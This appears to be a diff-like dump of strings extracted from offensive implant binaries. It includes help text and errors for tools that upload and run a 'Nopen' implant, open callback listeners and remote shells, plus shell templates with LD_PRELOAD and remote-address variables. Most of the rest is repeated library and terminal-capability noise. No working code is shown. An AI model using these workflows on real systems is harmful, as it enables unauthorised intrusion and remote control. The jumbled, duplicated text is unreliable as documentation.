+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_FCHMOD
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+execute
+help
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--execute can only be used with --command 0x04
+--start-ish cannot be specified with --execute
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+Execute_initializeClientSession: recv() failed
+Execute_connect: Trying %s:%d...
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_connect: Listening %s:%d
+Execute_connect: Accepted connection %s:%d
+Execute_transmit: recv() failed
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: send() failed
+Execute_connect: bind() failed
+Execute_connect: socket() failed
+Execute_connectlisten() failed
+Execute_connect: accept() failed
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_UNKNOWN
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+Execute_transmit: Execution error: The execl() system call failed: %s.
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Executable format error
+EXECUTE_ERROR_VERIEXEC
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+execute
+help
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--execute can only be used with --command 0x04
+--start-ish cannot be specified with --execute
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+Execute_initializeClientSession: recv() failed
+Execute_connect: Trying %s:%d...
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_connect: Listening %s:%d
+Execute_connect: Accepted connection %s:%d
+Execute_transmit: recv() failed
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: send() failed
+Execute_connect: bind() failed
+Execute_connect: socket() failed
+Execute_connectlisten() failed
+Execute_connect: accept() failed
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_UNKNOWN
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+Execute_transmit: Execution error: The execl() system call failed: %s.
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Executable format error
+EXECUTE_ERROR_VERIEXEC
+sleep
+execlp
+exit
+execute
+help
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--execute can only be used with --command 0x04
+--start-ish cannot be specified with --execute
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+Execute_initializeClientSession: recv() failed
+Execute_connect: Trying %s:%d...
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_connect: Listening %s:%d
+Execute_connect: Accepted connection %s:%d
+Execute_transmit: recv() failed
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: send() failed
+Execute_connect: bind() failed
+Execute_connect: socket() failed
+Execute_connectlisten() failed
+Execute_connect: accept() failed
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_UNKNOWN
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+Execute_transmit: Execution error: The execl() system call failed: %s.
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Executable format error
+EXECUTE_ERROR_VERIEXEC
+sleep
+execlp
+exit
+execute
+Warning --execute option is deprecated and will be removed in the future.
+Please begin using --upload-execute
+  -x, --upload-execute file                 - Use command 0x04 to upload and execute contents of given file
+      --execute        file (deprecated)
+  -X, --no-upload-execute cmd               - Use command 0x07 and to execute the given command on target
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04 or --command 0x07
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
+upload-execute
+no-upload-execute
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_FCHMOD
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+__cxa_atexit
+__cxa_atexit@@GLIBC_2.1.3
+execl
+execl@@GLIBC_2.0
+usleep
+execl
+regexec
+_exit
+execvp
+/usr/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+usleep
+execl
+execlp
+regexec
+_exit
+execvp
+ server will execute:
+noclient: server process at PID %ld exited early with status %hu (%s)
+Could not find/execute %s: %s
+FAILED TO NEGOTIATE WITH PEER, EXITING
+Incompatible versions. Use a different noclient or noserver. Exiting.
+down/cmdout
+Error during connection to %s:%hu, exiting
+Ran out of addresses to attempt, exiting
+Error during setup of listener *:%hu, exiting
+-exit
+-quit
+-help
+-shell
+[alt_shell]
+-upload
+-cmdout
+-ping
+       -ping host
+       -ping [-u|-t|-i] host
+ (should add help)
+ourtn is not executable, exiting
+noclient: executing: 
+noclient: ourtn exited early with status %hu
+noclient: ourtn exited early
+ourtn execution failed, exiting
+noclient: file upload complete, closing remote connection
+scanner is not executable, exiting
+Executing: %s %s
+Executing: %s -l %s
+	[1] Upload Nopen and start listener
+	[2] Upload Nopen and do callback
+	[4] Upload Nopen, using incision and ftshell, and do a callback
+	[5] Exit
+Which port will we be uploading nopen on?  
+Nopen to upload[] 
+	Nopen upload port [%d]
+	File to upload [%s]
+Exiting jackpop.
+sh -c 'UTC_OFFSET=%d RA=%s RP=%u CMD="%s" NOPENJACK=yes 
+xterm -hold -e sh -c 'RA=%s RP=%u LD_PRELOAD=../bin/connect.so CMD="%s" 
+sh -c 'RA=%s RP=%u LD_PRELOAD=../bin/connect.so CMD="%s" 
+[h]elp     - show this help
+quit
+Resource issues, sleeping.....
+Ping error (Got [8] bytes)
+ST STIME         COMM             CMD
+noclient: failed to execute %s: %s
+noclient: %s exited with status code %d
+sh -c "ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx "
+Starting NOPEN sub-shell (%s)
+Can't start the shell, range shutting down
+Unexpectedly done shelling, range shutting down
+Done shelling, range shutting down
+exit
+exit
+got this from shell: %s
+Sleep time may be about %d seconds
+Exec format error
+execvp: 
+mapping information
+exit 0
+noexec
+cannot dynamically load executable
+only ET_DYN and ET_EXEC can be loaded
+Exec format error
+Cannot exec a shared library directly
+noexec
+exit 0
+Exec format error
+Cannot exec a shared library directly
+noexec
+Exec format error
+Cannot exec a shared library directly
+exit 0
+noexec
+cannot dynamically load executable
+only ET_DYN and ET_EXEC can be loaded
+Cannot exec a shared library directly
+Exec format error
+exit
+help
+/usr/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+_exit
+atexit
+usleep
+execl
+execvp
+regexec
+getexecname
+/usr/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+/usr/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+_exit
+atexit
+usleep
+execl
+execvp
+regexec
+getexecname
+_exit
+atexit
+usleep
+execl
+execvp
+regexec
+getexecname
+/usr/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+_exit
+atexit
+usleep
+execl
+execvp
+regexec
+getexecname
+regexec
+usleep
+execl
+_exit
+execvp
+usleep
+execl
+regexec
+_exit
+execvp
+__cxa_atexit
+/libexec/ld-elf.so.1
+atexit
+_exit
+atexit
+atexit failed
+atexit
+exit
+atexit failed
+/libexec/ld-elf.so.1
+atexit
+/libexec/ld-elf.so.1
+atexit
+atexit
+__cxa_atexit
+atexit
+atexit failed
+Error: popping
+_exit
+atexit
+/usr/libexec/ld-elf.so.1
+atexit
+exit
+	-c COMMAND: shell command string
+	-f FILENAME: local Nopen file to upload
+	-n FILENAME: target executable name
+Read invalid data from server, exiting
+Executable name %s/%s exists
+Invalid response code returned 0x%08x, exiting.
+Bad cksum returned after upload, exiting.
+Received error response code for Nopen server execution, exiting
+Read error from socket() waiting for response, exiting...
+You have hit a special case that collides with the upload
+Cannot combine shell command mode with args to do socket reuse
+exit
+	-c COMMAND: shell command string
+	-f FILENAME: local Nopen file to upload
+	-n FILENAME: target executable name
+Read invalid data from server, exiting
+Executable name %s/%s exists
+Invalid response code returned 0x%08x, exiting.
+Bad cksum returned after upload, exiting.
+Received error response code for Nopen server execution, exiting
+Read error from socket() waiting for response, exiting...
+You have hit a special case that collides with the upload
+Cannot combine shell command mode with args to do socket reuse
+exit
+	-c COMMAND: shell command string
+	-f FILENAME: local Nopen file to upload
+	-n FILENAME: target executable name
+Read invalid data from server, exiting
+Executable name %s/%s exists
+Invalid response code returned 0x%08x, exiting.
+Bad cksum returned after upload, exiting.
+Received error response code for Nopen server execution, exiting
+Read error from socket() waiting for response, exiting...
+You have hit a special case that collides with the upload
+Cannot combine shell command mode with args to do socket reuse
+/usr/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+_exit
+atexit
+usleep
+execl
+execvp
+regexec
+/usr/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+Exec format error
+execvp: 
+mapping information
+Cannot exec a shared library directly
+Exec format error
+__libc_atexit
+usleep
+execl
+execlp
+_exit
+execvp
+ server will execute:
+      bytes: mapping %d, 
+down/cmdout
+Could not find/execute %s: %s
+Incompatible versions. Use a different noclient or noserver. Exiting.
+Error during connection to %s:%hu, exiting
+Ran out of addresses to attempt, exiting
+Error during setup of listener *:%hu, exiting
+-exit
+-quit
+-help
+-shell
+[alt_shell]
+-upload
+-cmdout
+-ping
+ (should add help)
+       -ping host
+       -ping [-u|-t|-i] host
+exiting...
+Executing: %s %s
+Noclient: Command we are executing... %s ...
+" >> /current/down/cmdout/scans
+Resource issues, sleeping.....
+[h]elp     - show this help
+sendcmd
+  <cmd_output id="%d">
+  </cmd_output>
+  <cmd_started txid="%d" id="%d" pid="-1">
+  </cmd_started>
+  <cmd_ended id="%d" />
+Starting NOPEN sub-shell (%s)
+Unexpectedly done shelling, range shutting down
+Done shelling, range shutting down
+Can't start the shell, range shutting down
+ping -c 1 -w 1 %s >/dev/null
+Ping string: %s
+Ping error (Got [8] bytes)
+	[1] Upload Nopen and start listener
+	[2] Upload Nopen and do callback
+	[4] Upload Nopen, using incision and ftshell, and do a callback
+xterm -hold -e sh -c 'RA=%s RP=%u LD_PRELOAD=../bin/connect.so CMD="%s" 
+Which port will we be uploading nopen on?  
+	[5] Exit
+sh -c 'UTC_OFFSET=%d RA=%s RP=%u CMD="%s" NOPENJACK=yes 
+sh -c 'RA=%s RP=%u LD_PRELOAD=../bin/connect.so CMD="%s" 
+Nopen to upload[] 
+	Nopen upload port [%d]
+	File to upload [%s]
+sh -c "ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx "
+Type DONE to quit -rawsend
+Ping error, closeing down
+exit
+got this from shell: %s
+Sleep time may be about %d seconds
+_exit
+atexit
+usleep
+execl
+execvp
+regexec
+atexit
+_exit
+exit
+regexec
+execl
+sleep
+execvp
+usleep
+/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+/libexec/ld-elf.so.1
+usleep
+execl
+regexec
+atexit
+_exit
+execvp
+_exit
+atexit
+usleep
+execl
+execvp
+regexec
+usleep
+execl
+regexec
+_exit
+execvp
+regexec
+usleep
+execl
+_exit
+execvp
+_exit
+atexit
+usleep
+execl
+execvp
+regexec
+execl
+exit
+execl
+exit
+nanosleep
+exit
+help
+Usage: quit or exit
+Close connections and exit the interactive client.
+exit
+help
+quit
+Usage: help [command]
+command is given, displays the detailed help message for that command.  If
+    Try 'help <command>' for a detailed help message for any of the
+       %s -h [ --help ]
+help
+List all available command:     'help'
+Terminate this program:         'quit' or Control-D
+quit
+exit
+Command '%s' unknown; try 'help'
+Command option error; try 'help %s'
+ping
+Usage: ping
+exit_standout_mode but no enter_standout_mode
+exit_alt_charset_mode but no enter_alt_charset_mode
+enter_alt_charset_mode but no exit_alt_charset_mode
+enter_blink_mode but no exit_attribute_mode
+enter_bold_mode but no exit_attribute_mode
+enter_ca_mode but no exit_ca_mode
+exit_ca_mode but no enter_ca_mode
+exit_delete_mode but no enter_delete_mode
+enter_delete_mode but no exit_delete_mode
+enter_dim_mode but no exit_attribute_mode
+exit_insert_mode but no enter_insert_mode
+enter_insert_mode but no exit_insert_mode
+enter_secure_mode but no exit_attribute_mode
+enter_protected_mode but no exit_attribute_mode
+enter_reverse_mode but no exit_attribute_mode
+exit_xon_mode but no enter_xon_mode
+enter_xon_mode but no exit_xon_mode
+exit_am_mode but no enter_am_mode
+enter_am_mode but no exit_am_mode
+enter_underline_mode but no exit_underline_mode
+exit_underline_mode but no enter_underline_mode
+exit_alt_charset_mode but no acs_chars
+enter_standout_mode but no exit_standout_mode
+exit_alt_charset_mode
+exit_attribute_mode
+exit_ca_mode
+exit_delete_mode
+exit_insert_mode
+exit_standout_mode
+exit_underline_mode
+exit_xon_mode
+exit_am_mode
+key_exit
+key_help
+key_sexit
+key_shelp
+exit_doublewide_mode
+exit_italics_mode
+exit_leftward_mode
+exit_micro_mode
+exit_shadow_mode
+exit_subscript_mode
+exit_superscript_mode
+exit_upward_mode
+exit_pc_charset_mode
+exit_scancode_mode
+cmdch
+kcmd
+kCMD
+nanosleep
+rl_executing_macro
+rl_executing_keymap
+_rl_pop_executing_macro
+def_shell_mode
+reset_shell_mode
+rl_execute_next
+_rl_clean_up_for_exit
+_rl_push_executing_macro
+                                      execution of the implant.
+help or ?                             Shows this command summary.
+ping                                  Tests for connectivity to sd module.
+quit or exit                          Exits.
+stopping at curr = %d
+quit
+ping
+exit_standout_mode but no enter_standout_mode
+enter_standout_mode but no exit_standout_mode
+exit_underline_mode but no enter_underline_mode
+enter_underline_mode but no exit_underline_mode
+exit_alt_charset_mode but no acs_chars
+exit_alt_charset_mode but no enter_alt_charset_mode
+enter_alt_charset_mode but no exit_alt_charset_mode
+enter_blink_mode but no exit_attribute_mode
+enter_bold_mode but no exit_attribute_mode
+enter_ca_mode but no exit_ca_mode
+exit_ca_mode but no enter_ca_mode
+exit_delete_mode but no enter_delete_mode
+enter_delete_mode but no exit_delete_mode
+enter_dim_mode but no exit_attribute_mode
+exit_insert_mode but no enter_insert_mode
+enter_insert_mode but no exit_insert_mode
+enter_secure_mode but no exit_attribute_mode
+enter_protected_mode but no exit_attribute_mode
+enter_reverse_mode but no exit_attribute_mode
+exit_xon_mode but no enter_xon_mode
+enter_xon_mode but no exit_xon_mode
+exit_am_mode but no enter_am_mode
+enter_am_mode but no exit_am_mode
+cmdch
+kcmd
+kCMD
+exit_alt_charset_mode
+exit_attribute_mode
+exit_ca_mode
+exit_delete_mode
+exit_insert_mode
+exit_standout_mode
+exit_underline_mode
+exit_xon_mode
+exit_am_mode
+key_exit
+key_help
+key_sexit
+key_shelp
+exit_doublewide_mode
+exit_italics_mode
+exit_leftward_mode
+exit_micro_mode
+exit_shadow_mode
+exit_subscript_mode
+exit_superscript_mode
+exit_upward_mode
+exit_pc_charset_mode
+exit_scancode_mode
+nanosleep
+rl_executing_keymap
+_rl_pop_executing_macro
+rl_execute_next
+_rl_clean_up_for_exit
+_rl_push_executing_macro
+_rl_executing_macro
+                                      execution of the implant.
+help or ?                             Shows this command summary.
+ping                                  Tests for connectivity to sd module.
+quit or exit                          Exits.
+ping
+help
+quit
+exit
+stopping at curr = %d
+nanosleep
+exit
+exit
+help
+quit
+Usage: help [command]
+Displays a list of all available commands or the detailed help message for
+    Try 'help <command>' for a detailed help message for any of the
+Usage: quit or exit
+Close connections and exit.
+help
+       %s -h [ --help ]
+quit
+exit
+Command option error; try 'help %s'
+Command '%s' unknown; try 'help'
+Not connected; try 'help network'
+List all available command:     'help'
+Terminate this program:         'quit' or Control-D
+help
+ping
+reloaded on any subsequent execution.
+Successful Cmds:   %d/%d
+Usage: ping
+Rule Notice: Stripping CR/LF from end of string
+Failed to parse source network address and port for tipping.
+Uploaded Time:      %d (secs)
+-----------Tipping Config-----------
+Tipping Available:  %s
+Cmd buffer:            %d 
+ Cmd buffer full:      %d 
+ Cmd queued:           %d 
+ Cmd dropped:          %d 
+nanosleep
+exit
+                                      execution of the implant.
+help or ?                             Shows this command summary.
+ping                                  Tests for connectivity to sd module.
+quit or exit                          Exits.
+ping
+stopping at curr = %d
+help
+quit
+exit
+help
+ping
+quit
+exit
+nanosleep
+exit
+exit
+help
+quit
+Usage: help [command]
+Displays a list of all available commands or the detailed help message for
+    Try 'help <command>' for a detailed help message for any of the
+Usage: quit or exit
+Close connections and exit.
+help
+       %s -h [ --help ]
+help
+List all available command:     'help'
+Terminate this program:         'quit' or Control-D
+quit
+exit
+Not connected; try 'help network'
+Command option error; try 'help %s'
+Command '%s' unknown; try 'help'
+ping
+Usage: ping
+Successful Cmds:   %d/%d
+Rule Notice: Stripping CR/LF from end of string
+reloaded on any subsequent execution.
+Tipping Available:  %s
+Cmd buffer:            %d 
+ Cmd buffer full:      %d 
+ Cmd queued:           %d 
+ Cmd dropped:          %d 
+Uploaded Time:      %d (secs)
+exit_alt_charset_mode
+exit_attribute_mode
+exit_ca_mode
+exit_delete_mode
+exit_insert_mode
+exit_standout_mode
+exit_underline_mode
+exit_xon_mode
+exit_am_mode
+key_exit
+key_help
+key_sexit
+key_shelp
+exit_doublewide_mode
+exit_italics_mode
+exit_leftward_mode
+exit_micro_mode
+exit_shadow_mode
+exit_subscript_mode
+exit_superscript_mode
+exit_upward_mode
+exit_pc_charset_mode
+exit_scancode_mode
+cmdch
+kcmd
+kCMD
+nanosleep
+exit
+exit
+help
+quit
+Usage: help [command]
+Displays a list of all available commands or the detailed help message for
+    Try 'help <command>' for a detailed help message for any of the
+Usage: quit or exit
+Close connections and exit.
+help
+       %s -h [ --help ]
+help
+List all available command:     'help'
